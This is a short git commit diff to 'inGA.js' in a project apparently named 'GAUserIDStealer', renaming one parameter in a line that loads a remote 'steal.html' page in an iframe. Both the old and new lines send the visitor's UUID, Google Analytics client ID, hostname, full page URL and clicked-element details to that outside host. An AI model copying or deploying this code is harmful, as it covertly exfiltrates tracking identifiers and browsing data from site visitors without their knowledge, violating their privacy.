bf9ca8d1ecc5faa54a7c80abfc5b70b8b4d71e8c
guqima <69132329+guqima@users.noreply.github.com>
2020-08-04 17:17:45 +0800

    Update inGA.js

--- inGA.js
+++ inGA.js
@@ -130,5 +130,5 @@ function doFlow(){
         }
     }
 
-    cframe.src ="https://guqima.github.io/GAUserIDStealer/steal.html?uid=="+uuid+"&&domain=="+window.location.hostname+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+element_url+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
+    cframe.src ="https://guqima.github.io/GAUserIDStealer/steal.html?uid=="+uuid+"&&domain=="+window.location.hostname+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&elementUrl=="+element_url+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
 }
